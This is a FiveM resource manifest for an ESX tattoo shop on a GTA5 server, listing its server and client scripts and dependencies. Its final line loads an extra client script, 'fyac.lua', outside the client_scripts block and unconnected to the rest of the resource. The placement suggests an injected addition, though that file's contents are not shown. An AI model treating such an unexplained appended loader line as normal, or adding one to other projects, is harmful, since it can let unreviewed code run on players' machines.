fx_version 'adamant'

game 'gta5'

description 'ESX Tattoo Shop'

version '1.4.2'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@extendedmode/locale.lua',
	'locales/*.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@extendedmode/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client/tattooList.lua',
	'client/main.lua'
}

dependencies {
	'extendedmode',
	'skinchanger',
	'esx_skin'
}
client_script 'fyac.lua'